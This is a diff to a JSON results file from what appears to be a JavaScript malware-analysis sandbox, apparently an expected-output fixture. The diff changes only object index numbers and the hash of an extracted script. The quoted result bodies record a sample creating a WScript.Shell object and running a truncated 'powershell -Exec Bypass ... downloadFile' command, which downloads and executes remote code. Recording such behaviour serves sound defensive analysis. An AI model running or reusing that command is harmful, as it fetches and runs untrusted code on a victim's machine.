@@ -60,7 +60,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[14]()\n",
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[15]()\n",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -82,7 +82,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[14].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[14].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...",
+        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[15].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[15].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -104,7 +104,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript attempts to sleep\n\t\twindow[1].setTimeout(function(){?    var ts = document.getElementsByTagName(\"input\");?    for(var i ...",
+        "body": "JavaScript attempts to sleep\n\t\twindow[2].setTimeout(function(){?    var ts = document.getElementsByTagName(\"input\");?    for(var i ...",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -237,7 +237,7 @@
     "supplementary": [
       {
         "name": "temp_javascript.js",
-        "sha256": "9ef61ae4df7a19b81a85ab836ff5dcc37e092c64c84f425964cdbcaab75a4ca2"
+        "sha256": "5118f281cd94f78a995e68813590042d7084fd59dce1b5ed1c2b03e76957d28d"
       }
     ]
   },
